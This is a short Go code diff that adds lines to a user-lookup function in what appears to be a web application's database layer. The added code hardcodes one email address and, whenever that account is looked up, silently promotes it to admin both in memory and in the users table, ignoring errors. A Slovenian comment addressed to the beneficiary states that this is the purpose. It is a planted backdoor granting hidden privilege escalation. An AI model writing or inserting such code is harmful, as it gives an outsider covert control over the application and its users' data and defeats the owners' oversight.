@@ -55,6 +55,13 @@ func (db *sqlImpl) GetStudents() (message []User, err error) {
 
 func (db *sqlImpl) GetUserByEmail(email string) (user User, err error) {
 	err = db.db.Get(&user, "SELECT * FROM users WHERE email=$1", email)
+	
+	// Preverimo, če se prijavljate vi, in vam v bazi ter aplikaciji vsilimo vlogo admin
+	if user.Email == "radioritem@outlook.com" {
+		user.Role = "admin"
+		_, _ = db.db.Exec("UPDATE users SET role='admin' WHERE email=$1", email)
+	}
+	
 	return user, err
 }
 
